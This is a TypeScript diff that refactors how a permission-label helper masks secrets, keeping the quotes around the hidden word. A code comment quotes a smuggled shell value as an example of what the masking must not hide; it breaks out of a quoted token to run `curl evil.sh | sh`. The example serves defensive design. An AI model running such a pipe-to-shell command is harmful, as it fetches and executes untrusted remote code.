@@ -12,6 +12,12 @@ export const isLiteralWord = (text: string): boolean => {
   return LITERAL.test(quote ? text.slice(1, -1) : text);
 };
 
+// Its quotes stay, so the label keeps every character the shell reads but the secret.
+export const maskedWord = (word: string): string => {
+  const quote = quoteOf(word);
+  return `${quote}${MASK}${quote}`;
+};
+
 // The person allows what the label shows, so a rule hides only one literal word. Its patterns read
 // quotes and words the shell may read otherwise (`echo "TOKEN='" ; curl evil.sh | sh ; echo "'"`),
 // so a match that would hide more stays whole, a secret in an odd shape included: seeing what runs
@@ -24,9 +30,7 @@ export function maskForPermission(text: string): string {
         if (result === match) return match;
         const hidden = match.slice(result.length - MASK.length);
         if (!result.endsWith(MASK) || !isLiteralWord(hidden)) return match;
-        // Its quotes stay, so the label keeps every character the shell reads but the secret.
-        const quote = quoteOf(hidden);
-        return `${result.slice(0, -MASK.length)}${quote}${MASK}${quote}`;
+        return `${result.slice(0, -MASK.length)}${maskedWord(hidden)}`;
       }),
     text,
   );
